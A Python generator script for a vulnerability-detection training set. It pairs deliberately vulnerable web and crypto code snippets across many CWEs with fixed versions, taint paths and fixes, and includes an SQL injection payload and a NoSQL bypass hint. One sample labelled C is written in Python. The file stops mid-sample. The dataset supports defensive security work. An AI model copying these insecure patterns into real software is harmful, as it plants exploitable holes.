"""
指令蒸馏训练数据集生成器 —— 用 AI 助手知识构造覆盖 45+ CWE 的代码安全分析样本。

每条样本导出为 ChatML（Qwen2.5-Coder 原生格式）：
  {"messages": [
      {"role": "system", "content": SYSTEM_PROMPT},
      {"role": "user",   "content": build_user_prompt(code, language, filename)},
      {"role": "assistant", "content": <CoT 分析过程> + "```json\n{...}\n```"}
  ]}

样本设计原则：
1. 漏洞样本与安全对照样本成对出现，让模型学会区分"有防御 vs 无防御"
2. 每条 assistant 回复包含 5 步 CoT（source → sink → 防御 → 有效性 → 结论）
3. 多语言覆盖：Python / Java / PHP / JavaScript / C / Go
4. 难度梯度：典型漏洞 + 绕过变体 + 真实 CVE 片段 + 长文件隐藏
5. 不与 exp_04 测试样本代码重复，避免训练-测试泄露
"""

import json
import os
from graduation_project.prompts import SYSTEM_PROMPT, build_user_prompt

SAMPLES_DIR = os.path.join(os.path.dirname(__file__), "..", "data")
OUTPUT_FILE = os.path.join(SAMPLES_DIR, "train_chatml.jsonl")


# ---------------------------------------------------------------------------
# 样本数据结构
# 每个样本是一个 dict：
#   code, language, filename,
#   has_vulnerability, vuln_type, risk_level, source, sink,
#   taint_path, fix_idea, analysis（CoT 分析文本，可省略由模板生成）
# ---------------------------------------------------------------------------

SAMPLES = []


def add(code, language, filename, has_vulnerability, vuln_type, risk_level,
        source, sink, taint_path, fix_idea, analysis=None, cot_type=None):
    """添加一条样本。

    cot_type 控制 build_analysis() 选择哪种 CoT 模板（不传则按 source-sink 默认）：
      - source_sink      注入类：source → sink → 防御 → 有效性 → 结论
      - missing_control  缺失控制类（CSRF/authz/session）：控制点检查 → 是否缺失 → 后果 → 结论
      - hardcoded_secret 硬编码凭证：凭证位置 → 是否字面量 → 是否从环境读取 → 结论
      - integer_overflow 整数溢出：运算 → 范围检查 → 溢出可能 → 后果 → 结论
      - crypto_weakness  弱加密：算法/参数 → 强度评估 → 已知攻击 → 结论
      - info_disclosure  信息泄露：泄露内容 → 接收方 → 是否敏感 → 结论
      - race_condition   竞态：共享状态 → 同步机制 → 时间窗口 → 结论
    """
    SAMPLES.append({
        "code": code.strip(),
        "language": language,
        "filename": filename,
        "has_vulnerability": has_vulnerability,
        "vulnerability_type": vuln_type,
        "risk_level": risk_level,
        "source": source,
        "sink": sink,
        "taint_path": taint_path,
        "fix_idea": fix_idea,
        "analysis": analysis,
        "cot_type": cot_type,
    })


# ===========================================================================
# 1. SQL 注入（CWE-89）
# ===========================================================================

add(
    """
@app.route('/search')
def search():
    keyword = request.args.get('q', '')
    query = "SELECT * FROM products WHERE name LIKE '%" + keyword + "%'"
    cursor = db.cursor()
    cursor.execute(query)
    return jsonify(cursor.fetchall())
""",
    "python", "vuln_sql_concat.py",
    True, "CWE-89 SQL注入", "Critical",
    "request.args.get('q')", "cursor.execute(query)",
    "request.args.get('q') → keyword → 字符串拼接 → query → cursor.execute(query)",
    "使用参数化查询：cursor.execute(\"SELECT * FROM products WHERE name LIKE %s\", (f'%{keyword}%',))",
    analysis=(
        "分析过程：\n"
        "1. 污染源：request.args.get('q') 从 URL 查询参数获取用户输入，完全可控。\n"
        "2. 危险 sink：cursor.execute(query) 直接执行 SQL 语句。\n"
        "3. 数据流：keyword 通过字符串拼接 \"... LIKE '%\" + keyword + \"%'\" 进入 query，未经过任何转义或参数化。\n"
        "4. 防御检查：代码中无参数化查询、无 ORM、无输入校验，字符串拼接直接进入 execute。\n"
        "5. 结论：用户可通过注入 ' OR 1=1 -- 等 payload 篡改 SQL 语义，构成 SQL 注入漏洞，风险等级 Critical。"
    ),
)

add(
    """
@app.route('/search')
def search():
    keyword = request.args.get('q', '')
    cursor = db.cursor()
    cursor.execute("SELECT * FROM products WHERE name LIKE %s", (f'%{keyword}%',))
    return jsonify(cursor.fetchall())
""",
    "python", "safe_sql_param.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
    analysis=(
        "分析过程：\n"
        "1. 污染源：request.args.get('q') 获取用户输入。\n"
        "2. 危险 sink：cursor.execute(...) 执行 SQL。\n"
        "3. 数据流：keyword 作为参数元组 (f'%{keyword}%',) 的元素传入 execute。\n"
        "4. 防御检查：使用 %s 占位符 + 参数元组，这是参数化查询的标准写法。"
        "数据库驱动会对参数值自动转义，keyword 不会进入 SQL 语法层。命中安全模式白名单第 1 条。\n"
        "5. 结论：参数化查询有效防御 SQL 注入，未发现漏洞。"
    ),
)

add(
    """
@app.route('/user')
def get_user():
    uid = request.args.get('id')
    query = "SELECT * FROM users WHERE id = {}".format(uid)
    cursor.execute(query)
""",
    "python", "vuln_sql_format.py",
    True, "CWE-89 SQL注入", "Critical",
    "request.args.get('id')", "cursor.execute(query)",
    "request.args.get('id') → uid → str.format 拼接 → query → cursor.execute",
    "使用参数化查询：cursor.execute(\"SELECT * FROM users WHERE id = %s\", (uid,))",
)

add(
    """
@app.route('/login')
def login():
    username = request.form['username']
    password = request.form['password']
    sql = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    cursor.execute(sql)
""",
    "python", "vuln_sql_fstring.py",
    True, "CWE-89 SQL注入", "Critical",
    "request.form['username'] / request.form['password']", "cursor.execute(sql)",
    "request.form → username/password → f-string 拼接 → sql → cursor.execute",
    "使用参数化查询：cursor.execute(\"SELECT ... WHERE username=%s AND password=%s\", (username, password))",
)

# Java JDBC SQL 注入
add(
    """
@RestController
public class UserController {
    @GetMapping("/user")
    public User getUser(@RequestParam String id) throws SQLException {
        String sql = "SELECT * FROM users WHERE id = '" + id + "'";
        Statement stmt = conn.createStatement();
        ResultSet rs = stmt.executeQuery(sql);
        return mapUser(rs);
    }
}
""",
    "java", "vuln_java_jdbc_sql.java",
    True, "CWE-89 SQL注入", "Critical",
    "@RequestParam id", "stmt.executeQuery(sql)",
    "@RequestParam id → 字符串拼接 → sql → Statement.executeQuery",
    "使用 PreparedStatement：PreparedStatement ps = conn.prepareStatement(\"SELECT * FROM users WHERE id = ?\"); ps.setString(1, id);",
)

add(
    """
@RestController
public class UserController {
    @GetMapping("/user")
    public User getUser(@RequestParam String id) throws SQLException {
        PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
        ps.setString(1, id);
        ResultSet rs = ps.executeQuery();
        return mapUser(rs);
    }
}
""",
    "java", "safe_java_prepared.java",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

# ===========================================================================
# 2. 命令注入（CWE-78）
# ===========================================================================

add(
    """
@app.route('/ping')
def ping():
    host = request.args.get('host', '')
    result = subprocess.run(f'ping -c 1 {host}', shell=True, capture_output=True, text=True)
    return result.stdout
""",
    "python", "vuln_cmd_shell.py",
    True, "CWE-78 命令注入", "Critical",
    "request.args.get('host')", "subprocess.run(shell=True)",
    "request.args.get('host') → host → f-string 命令 → subprocess.run(shell=True)",
    "使用参数列表：subprocess.run(['ping', '-c', '1', host], shell=False)",
)

add(
    """
@app.route('/ping')
def ping():
    host = request.args.get('host', '')
    result = subprocess.run(['ping', '-c', '1', host], capture_output=True, text=True)
    return result.stdout
""",
    "python", "safe_cmd_list.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

add(
    """
const { exec } = require('child_process');
app.get('/compress', (req, res) => {
    const file = req.query.file;
    exec(`gzip ${file}`, (err, stdout) => res.send(stdout));
});
""",
    "javascript", "vuln_cmd_js.js",
    True, "CWE-78 命令注入", "Critical",
    "req.query.file", "exec(`gzip ${file}`)",
    "req.query.file → file → 模板字符串拼接 → exec",
    "使用 execFile：execFile('gzip', [file], callback)",
)

add(
    """
app.get('/compress', (req, res) => {
    const file = req.query.file;
    execFile('gzip', [file], (err, stdout) => res.send(stdout));
});
""",
    "javascript", "safe_cmd_js.js",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

# ===========================================================================
# 3. XSS（CWE-79）
# ===========================================================================

add(
    """
@app.route('/greet')
def greet():
    name = request.args.get('name', '')
    return f'<h1>Hello, {name}!</h1>'
""",
    "python", "vuln_xss_fstring.py",
    True, "CWE-79 XSS", "High",
    "request.args.get('name')", "f-string 拼接到 HTTP 响应",
    "request.args.get('name') → name → f-string → HTTP 响应体",
    "使用 html.escape() 转义：return f'<h1>Hello, {html.escape(name)}!</h1>'",
)

add(
    """
@app.route('/greet')
def greet():
    name = request.args.get('name', '')
    return f'<h1>Hello, {html.escape(name)}!</h1>'
""",
    "python", "safe_xss_escape.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

add(
    """
<?php
$name = $_GET['name'];
echo "<h1>Hello, " . $name . "!</h1>";
?>
""",
    "php", "vuln_xss_php.php",
    True, "CWE-79 XSS", "High",
    "$_GET['name']", "echo $name",
    "$_GET['name'] → $name → 字符串拼接 → echo",
    "使用 htmlspecialchars：echo '<h1>Hello, ' . htmlspecialchars($name, ENT_QUOTES, 'UTF-8') . '!</h1>'",
)

add(
    """
<?php
$name = $_GET['name'];
echo "<h1>Hello, " . htmlspecialchars($name, ENT_QUOTES, 'UTF-8') . "!</h1>";
?>
""",
    "php", "safe_xss_php.php",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

# ===========================================================================
# 4. 路径穿越（CWE-22）
# ===========================================================================

add(
    """
@app.route('/file')
def get_file():
    filename = request.args.get('file', '')
    full_path = os.path.join('/var/data', filename)
    with open(full_path) as f:
        return f.read()
""",
    "python", "vuln_path_join.py",
    True, "CWE-22 路径穿越", "High",
    "request.args.get('file')", "open(full_path)",
    "request.args.get('file') → filename → os.path.join → open(full_path)",
    "校验绝对路径：abs_path = os.path.abspath(full_path); if not abs_path.startswith('/var/data/'): abort(403)",
)

add(
    """
@app.route('/file')
def get_file():
    filename = request.args.get('file', '')
    base = '/var/data'
    full_path = os.path.abspath(os.path.join(base, filename))
    if not full_path.startswith(base + os.sep):
        abort(403)
    with open(full_path) as f:
        return f.read()
""",
    "python", "safe_path_check.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

# ===========================================================================
# 5. 不安全反序列化（CWE-502）
# ===========================================================================

add(
    """
@app.route('/load')
def load_session():
    raw = request.get_data()
    data = pickle.loads(raw)
    return jsonify(data)
""",
    "python", "vuln_pickle.py",
    True, "CWE-502 不安全反序列化", "Critical",
    "request.get_data()", "pickle.loads(raw)",
    "request.get_data() → raw → pickle.loads → 任意代码执行",
    "不要用 pickle 反序列化不可信数据，改用 json.loads",
)

add(
    """
@app.route('/load')
def load_session():
    raw = request.get_data()
    data = json.loads(raw)
    return jsonify(data)
""",
    "python", "safe_json_loads.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

add(
    """
@app.route('/config')
def load_config():
    body = request.get_data()
    config = yaml.load(body, Loader=yaml.Loader)
    return jsonify(config)
""",
    "python", "vuln_yaml_load.py",
    True, "CWE-502 不安全反序列化", "Critical",
    "request.get_data()", "yaml.load(body, Loader=yaml.Loader)",
    "request.get_data() → body → yaml.load(Loader=yaml.Loader) → 任意对象构造",
    "改用 yaml.safe_load(body)",
)

add(
    """
@app.route('/config')
def load_config():
    body = request.get_data()
    config = yaml.safe_load(body)
    return jsonify(config)
""",
    "python", "safe_yaml_load.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

# Java Fastjson 反序列化
add(
    """
@RestController
public class ApiController {
    @PostMapping("/api")
    public Object handle(@RequestBody String body) {
        return JSON.parseObject(body, Object.class);
    }
}
""",
    "java", "vuln_fastjson.java",
    True, "CWE-502 不安全反序列化", "Critical",
    "@RequestBody body", "JSON.parseObject(body)",
    "@RequestBody body → JSON.parseObject → 触发 @type 自动类型解析 → 远程类加载",
    "升级 Fastjson 到最新版并关闭 AutoType：ParserConfig.getGlobalInstance().setAutoTypeSupport(false)",
)

# ===========================================================================
# 6. 硬编码凭证（CWE-798）
# ===========================================================================

add(
    """
AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"
AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

s3 = boto3.client('s3',
    aws_access_key_id=AWS_ACCESS_KEY,
    aws_secret_access_key=AWS_SECRET_KEY)
""",
    "python", "vuln_hardcoded_aws.py",
    True, "CWE-798 硬编码凭证", "High",
    "源码字面量", "boto3.client(aws_access_key_id=..., aws_secret_access_key=...)",
    "源码常量 AWS_ACCESS_KEY / AWS_SECRET_KEY → boto3.client",
    "从环境变量或 AWS Secrets Manager 读取：os.environ['AWS_ACCESS_KEY_ID']",
    cot_type="hardcoded_secret",
)

add(
    """
import os
s3 = boto3.client('s3',
    aws_access_key_id=os.environ['AWS_ACCESS_KEY_ID'],
    aws_secret_access_key=os.environ['AWS_SECRET_ACCESS_KEY'])
""",
    "python", "safe_env_credentials.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

add(
    """
DB_PASSWORD = "admin123"
conn = psycopg2.connect(
    host='localhost',
    password=DB_PASSWORD)
""",
    "python", "vuln_hardcoded_db_password.py",
    True, "CWE-798 硬编码凭证", "High",
    "源码字面量", "psycopg2.connect(password=DB_PASSWORD)",
    "源码常量 DB_PASSWORD = 'admin123' → psycopg2.connect",
    "从环境变量或配置文件读取：os.environ['DB_PASSWORD']",
    cot_type="hardcoded_secret",
)

# ===========================================================================
# 7. SSRF（CWE-918）
# ===========================================================================

add(
    """
@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    response = urllib.request.urlopen(url)
    return response.read()
""",
    "python", "vuln_ssrf_urllib.py",
    True, "CWE-918 SSRF", "High",
    "request.args.get('url')", "urllib.request.urlopen(url)",
    "request.args.get('url') → url → urllib.request.urlopen",
    "校验 URL 主机白名单，禁止访问内网/元数据端点（169.254.169.254 等）",
)

add(
    """
@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    parsed = urllib.parse.urlparse(url)
    if parsed.hostname in ['api.example.com', 'cdn.example.com']:
        response = urllib.request.urlopen(url)
        return response.read()
    abort(403)
""",
    "python", "safe_ssrf_whitelist.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

# ===========================================================================
# 8. 代码注入（CWE-94）
# ===========================================================================

add(
    """
@app.route('/calc')
def calc():
    expr = request.args.get('expr')
    result = eval(expr)
    return str(result)
""",
    "python", "vuln_eval.py",
    True, "CWE-94 代码注入", "Critical",
    "request.args.get('expr')", "eval(expr)",
    "request.args.get('expr') → expr → eval(expr) → 任意代码执行",
    "禁用 eval，改用 ast.literal_eval（仅字面量）或专用表达式解析库",
)

add(
    """
@app.route('/calc')
def calc():
    expr = request.args.get('expr')
    result = ast.literal_eval(expr)
    return str(result)
""",
    "python", "safe_literal_eval.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

# ===========================================================================
# 9. 开放重定向（CWE-601）
# ===========================================================================

add(
    """
@app.route('/redirect')
def redirect_url():
    target = request.args.get('url', '/')
    return redirect(target)
""",
    "python", "vuln_open_redirect.py",
    True, "CWE-601 开放重定向", "Medium",
    "request.args.get('url')", "redirect(target)",
    "request.args.get('url') → target → redirect(target)",
    "校验目标 URL 必须为站内相对路径或受信域名白名单",
)

add(
    """
@app.route('/redirect')
def redirect_url():
    target = request.args.get('url', '/')
    if not target.startswith('/') or target.startswith('//'):
        abort(400)
    return redirect(target)
""",
    "python", "safe_open_redirect.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

# ===========================================================================
# 10. CSRF（CWE-352）
# ===========================================================================

add(
    """
@app.route('/transfer', methods=['POST'])
def transfer():
    to = request.form['to']
    amount = request.form['amount']
    db.transfer(current_user, to, amount)
    return 'OK'
""",
    "python", "vuln_csrf.py",
    True, "CWE-352 CSRF", "Medium",
    "request.form（无 CSRF token 校验）", "db.transfer",
    "POST 表单无 CSRF token → 攻击者可构造跨站表单 → 触发转账",
    "加入 CSRF token 校验：validate_csrf_token(request.form.get('csrf_token'))",
    cot_type="missing_control",
)

add(
    """
@app.route('/transfer', methods=['POST'])
def transfer():
    if not validate_csrf_token(request.form.get('csrf_token')):
        abort(403)
    to = request.form['to']
    amount = request.form['amount']
    db.transfer(current_user, to, amount)
    return 'OK'
""",
    "python", "safe_csrf_token.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

# ===========================================================================
# 11. XXE（CWE-611）
# ===========================================================================

add(
    """
@app.route('/parse')
def parse_xml():
    body = request.get_data()
    root = ET.fromstring(body)
    return jsonify(extract_data(root))
""",
    "python", "vuln_xxe.py",
    True, "CWE-611 XXE", "High",
    "request.get_data()", "ET.fromstring(body)",
    "request.get_data() → body → ET.fromstring（默认解析外部实体）",
    "使用 defusedxml：from defusedxml.ElementTree import fromstring",
)

add(
    """
from defusedxml.ElementTree import fromstring as safe_fromstring
@app.route('/parse')
def parse_xml():
    body = request.get_data()
    root = safe_fromstring(body)
    return jsonify(extract_data(root))
""",
    "python", "safe_xxe_defused.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

# ===========================================================================
# 12. SSTI（CWE-1336）
# ===========================================================================

add(
    """
@app.route('/render')
def render_template():
    template = request.args.get('tpl', 'Hello')
    return render_template_string(template)
""",
    "python", "vuln_ssti.py",
    True, "CWE-1336 SSTI", "Critical",
    "request.args.get('tpl')", "render_template_string(template)",
    "request.args.get('tpl') → template → render_template_string → Jinja2 模板渲染 → 代码执行",
    "不要渲染用户输入；改用预定义模板 + 参数：render_template_string('Hello {{name}}', name=tpl)",
)

add(
    """
@app.route('/render')
def render_template():
    name = request.args.get('name', '')
    return render_template_string('Hello {{ name }}', name=name)
""",
    "python", "safe_ssti.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

# ===========================================================================
# 13. 弱加密/弱哈希（CWE-327 / CWE-329 / CWE-330）
# ===========================================================================

add(
    """
def hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()
""",
    "python", "vuln_md5_password.py",
    True, "CWE-327 弱哈希", "High",
    "password 参数", "hashlib.md5",
    "password → hashlib.md5 → 16 字节摘要，易碰撞，无盐",
    "使用 bcrypt 或 argon2：bcrypt.hashpw(password.encode(), bcrypt.gensalt())",
    cot_type="crypto_weakness",
)

add(
    """
def hash_password(password):
    return bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt(rounds=12))
""",
    "python", "safe_bcrypt.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

add(
    """
import random
def generate_token():
    return str(random.randint(100000, 999999))
""",
    "python", "vuln_weak_random.py",
    True, "CWE-330 弱随机数", "High",
    "random.randint", "token 生成",
    "random 模块使用 Mersenne Twister，非密码学安全 → token 可预测",
    "使用 secrets.token_hex(32) 生成密码学安全随机数",
    cot_type="crypto_weakness",
)

add(
    """
import secrets
def generate_token():
    return secrets.token_hex(32)
""",
    "python", "safe_secrets_token.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

add(
    """
from Crypto.Cipher import AES
KEY = b'sixteenbytekey!!'
IV = b'fixediv123456789'
cipher = AES.new(KEY, AES.MODE_CBC, IV)
ct = cipher.encrypt(plaintext)
""",
    "python", "vuln_hardcoded_iv.py",
    True, "CWE-329 硬编码IV", "High",
    "源码常量 IV", "AES.new(KEY, MODE_CBC, IV)",
    "硬编码 IV + 固定密钥 → 相同明文产生相同密文 → 可推断模式",
    "每次加密生成随机 IV：os.urandom(16)，并随密文一起传输",
    cot_type="crypto_weakness",
)

# ===========================================================================
# 14. JWT none 算法（CWE-347）
# ===========================================================================

add(
    """
def verify_token(token):
    payload = jwt.decode(token, options={'verify_signature': False})
    return payload
""",
    "python", "vuln_jwt_no_verify.py",
    True, "CWE-347 JWT签名未校验", "Critical",
    "token 参数", "jwt.decode(verify_signature=False)",
    "jwt.decode 关闭签名校验 → 攻击者可伪造任意 payload",
    "始终校验签名：jwt.decode(token, SECRET_KEY, algorithms=['HS256'])",
    cot_type="crypto_weakness",
)

add(
    """
def verify_token(token):
    payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
    return payload
""",
    "python", "safe_jwt_verify.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

# ===========================================================================
# 15. 证书验证缺失（CWE-295）
# ===========================================================================

add(
    """
import requests
@app.route('/proxy')
def proxy():
    url = request.args.get('url')
    resp = requests.get(url, verify=False)
    return resp.text
""",
    "python", "vuln_tls_no_verify.py",
    True, "CWE-295 证书验证缺失", "High",
    "request.args.get('url')", "requests.get(verify=False)",
    "requests.get(verify=False) → 关闭 TLS 证书校验 → 中间人攻击",
    "移除 verify=False，使用默认证书校验；必要时指定 CA bundle",
)

add(
    """
import requests
@app.route('/proxy')
def proxy():
    url = request.args.get('url')
    resp = requests.get(url)  # 默认 verify=True
    return resp.text
""",
    "python", "safe_tls_verify.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

# ===========================================================================
# 16. 缺失认证（CWE-306）/ 缺失授权（CWE-862）/ IDOR（CWE-639）
# ===========================================================================

add(
    """
@app.route('/admin/users')
def list_users():
    users = db.query('SELECT * FROM users')
    return jsonify(users)
""",
    "python", "vuln_missing_auth.py",
    True, "CWE-306 缺失认证", "High",
    "无认证检查", "db.query",
    "/admin/users 路由无 @login_required → 任意访问者可获取用户列表",
    "加入认证装饰器：@login_required + @admin_required",
    cot_type="missing_control",
)

add(
    """
@app.route('/admin/users')
@login_required
@admin_required
def list_users():
    users = db.query('SELECT * FROM users')
    return jsonify(users)
""",
    "python", "safe_auth_required.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

add(
    """
@app.route('/api/order/<int:order_id>')
def get_order(order_id):
    order = Order.query.get(order_id)
    return jsonify(order.to_dict())
""",
    "python", "vuln_idor.py",
    True, "CWE-639 IDOR", "High",
    "order_id 路径参数", "Order.query.get(order_id)",
    "order_id 直接查询，未校验是否属于当前用户 → 越权访问他人订单",
    "校验归属：order = Order.query.get(order_id); if order.user_id != current_user.id: abort(403)",
    cot_type="missing_control",
)

add(
    """
@app.route('/api/order/<int:order_id>')
@login_required
def get_order(order_id):
    order = Order.query.get(order_id)
    if order.user_id != current_user.id:
        abort(403)
    return jsonify(order.to_dict())
""",
    "python", "safe_idor_check.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

# ===========================================================================
# 17. 会话固定（CWE-384）
# ===========================================================================

add(
    """
@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form)
    if user:
        session['user_id'] = user.id  # 不重新生成 session
        return 'OK'
""",
    "python", "vuln_session_fixation.py",
    True, "CWE-384 会话固定", "Medium",
    "登录前 session id", "session['user_id'] = user.id",
    "登录后未重新生成 session id → 攻击者可预设 session id 实施会话固定",
    "登录成功后重新生成 session：session.regenerate() 或 flask.session.clear() + 新 session",
    cot_type="missing_control",
)

add(
    """
@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form)
    if user:
        session.clear()  # 防止会话固定
        session['user_id'] = user.id
        session.permanent = True
        return 'OK'
""",
    "python", "safe_session_regen.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

# ===========================================================================
# 18. LDAP 注入（CWE-90）/ XPath 注入（CWE-643）/ NoSQL 注入（CWE-943）
# ===========================================================================

add(
    """
def ldap_search(username):
    filter = f"(uid={username})"
    results = conn.search_s('dc=example,dc=com', ldap.SCOPE_SUBTREE, filter)
    return results
""",
    "python", "vuln_ldap_injection.py",
    True, "CWE-90 LDAP注入", "High",
    "username 参数", "conn.search_s(filter)",
    "username → f-string 拼接 LDAP filter → conn.search_s → LDAP 注入",
    "对 username 转义特殊字符：username = ldap.escape_filter_chars(username)",
)

add(
    """
def ldap_search(username):
    username = ldap.escape_filter_chars(username)
    filter = f"(uid={username})"
    results = conn.search_s('dc=example,dc=com', ldap.SCOPE_SUBTREE, filter)
    return results
""",
    "python", "safe_ldap_escape.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

add(
    """
def find_user(username):
    query = f"//user[name='{username}']"
    result = tree.xpath(query)
    return result
""",
    "python", "vuln_xpath_injection.py",
    True, "CWE-643 XPath注入", "High",
    "username 参数", "tree.xpath(query)",
    "username → f-string 拼接 XPath → tree.xpath → XPath 注入",
    "使用参数化 XPath：tree.xpath('//user[name=$name]', name=username)",
)

add(
    """
@app.route('/user')
def get_user():
    username = request.args.get('name')
    query = {"username": username}
    user = db.users.find_one(query)
    return jsonify(user)
""",
    "python", "vuln_nosql_injection.py",
    True, "CWE-943 NoSQL注入", "High",
    "request.args.get('name')", "db.users.find_one(query)",
    "request.args.get('name') → username → find_one 查询 → 若传入 {$ne: null} 可绕过认证",
    "校验输入类型：if not isinstance(username, str): abort(400)",
)

# ===========================================================================
# 19. 竞态条件（CWE-362）
# ===========================================================================

add(
    """
balance = {}
@app.route('/withdraw')
def withdraw():
    user = request.args.get('user')
    amount = int(request.args.get('amount', 0))
    if balance.get(user, 0) >= amount:
        # 时间窗口：TOCTOU
        balance[user] = balance.get(user, 0) - amount
        return f'Withdraw {amount}'
    return 'Insufficient funds'
""",
    "python", "vuln_race_condition.py",
    True, "CWE-362 竞态条件", "Medium",
    "并发请求", "balance 读写无锁",
    "check-then-use 之间存在时间窗口 → 并发请求可双重消费",
    "加锁：with threading.Lock(): ... 或使用原子操作/事务",
    cot_type="race_condition",
)

add(
    """
import threading
balance = {}
lock = threading.Lock()
@app.route('/withdraw')
def withdraw():
    user = request.args.get('user')
    amount = int(request.args.get('amount', 0))
    with lock:
        if balance.get(user, 0) >= amount:
            balance[user] = balance.get(user, 0) - amount
            return f'Withdraw {amount}'
    return 'Insufficient funds'
""",
    "python", "safe_race_lock.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

# ===========================================================================
# 20. 整数溢出（CWE-190）/ ReDoS（CWE-1333）
# ===========================================================================

add(
    """
def calculate_total(price, quantity):
    total = price * quantity  # 未检查溢出
    return total
""",
    "c", "vuln_integer_overflow.c",
    True, "CWE-190 整数溢出", "High",
    "price/quantity 参数", "price * quantity",
    "price * quantity 可能超出 int 范围 → 整数溢出 → 负数或绕过校验",
    "使用安全整数运算：__builtin_mul_overflow 或大整数库",
    cot_type="integer_overflow",
)

add(
    """
import re
def validate_email(email):
    pattern = r'^([a-zA-Z0-9._%+-]+)@([a-zA-Z0-9.-]+\\.[a-zA-Z]{2,})$'
    if re.match(pattern, email):
        return True
    return False
""",
    "python", "safe_email_regex.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

add(
    """
import re
def parse_input(text):
    # 灾难性回溯
    pattern = r'(a+)+b'
    return re.match(pattern, text)
""",
    "python", "vuln_redos.py",
    True, "CWE-1333 ReDoS", "High",
    "text 参数", "re.match(pattern, text)",
    "(a+)+ 嵌套量词 → 指数级回溯 → 拒绝服务",
    "避免嵌套量词，使用原子组或预编译安全正则",
)

# ===========================================================================
# 21. 文件上传（CWE-434）
# ===========================================================================

add(
    """
@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['file']
    file.save(os.path.join('/var/uploads', file.filename))
    return 'Uploaded'
""",
    "python", "vuln_file_upload.py",
    True, "CWE-434 文件上传", "High",
    "request.files['file']", "file.save",
    "用户上传文件名未校验 → 可上传 .php/.jsp 等 webshell",
    "校验扩展名白名单 + 重命名文件 + 校验 MIME 类型",
)

add(
    """
@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['file']
    ALLOWED = {'.jpg', '.png', '.pdf'}
    ext = os.path.splitext(file.filename)[1].lower()
    if ext not in ALLOWED:
        abort(400)
    safe_name = secrets.token_hex(16) + ext
    file.save(os.path.join('/var/uploads', safe_name))
    return 'Uploaded'
""",
    "python", "safe_file_upload.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

# ===========================================================================
# 22. 信息泄露（CWE-200 / CWE-209 / CWE-532）
# ===========================================================================

add(
    """
@app.route('/debug')
def debug_info():
    import traceback
    try:
        risky_operation()
    except Exception as e:
        return traceback.format_exc()  # 返回完整堆栈给用户
""",
    "python", "vuln_stack_trace.py",
    True, "CWE-209 错误信息泄露", "Medium",
    "异常堆栈", "return traceback.format_exc()",
    "返回完整堆栈 → 泄露文件路径、库版本、内部结构",
    "返回通用错误消息：return 'Internal Error', 500；日志记录堆栈",
    cot_type="info_disclosure",
)

add(
    """
@app.route('/debug')
def debug_info():
    try:
        risky_operation()
    except Exception as e:
        app.logger.exception('Operation failed')
        return 'Internal Error', 500
""",
    "python", "safe_error_handle.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

add(
    """
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    user = db.query(f"SELECT * FROM users WHERE name='{username}'")
    if not user:
        return 'User not found'
    if user.password != password:
        return 'Password incorrect'
    return 'OK'
""",
    "python", "vuln_user_enumeration.py",
    True, "CWE-204 用户枚举", "Low",
    "差异化错误消息", "return 'User not found' / 'Password incorrect'",
    "登录失败消息区分用户不存在与密码错误 → 攻击者可枚举有效用户名",
    "统一错误消息：return 'Invalid username or password'",
    cot_type="info_disclosure",
)

# ===========================================================================
# 23. 批量赋值（CWE-915）
# ===========================================================================

add(
    """
@app.route('/profile', methods=['POST'])
def update_profile():
    user = User.query.get(session['user_id'])
    for key, value in request.form.items():
        setattr(user, key, value)
    db.session.commit()
    return 'Updated'
""",
    "python", "vuln_mass_assignment.py",
    True, "CWE-915 批量赋值", "High",
    "request.form.items()", "setattr(user, key, value)",
    "request.form 所有字段 setattr → 攻击者可修改 is_admin 字段",
    "白名单字段：ALLOWED = {'name', 'email'}; for k, v in request.form.items(): if k in ALLOWED: setattr(user, k, v)",
    cot_type="missing_control",
)

add(
    """
@app.route('/profile', methods=['POST'])
def update_profile():
    user = User.query.get(session['user_id'])
    ALLOWED = {'name', 'email'}
    for key, value in request.form.items():
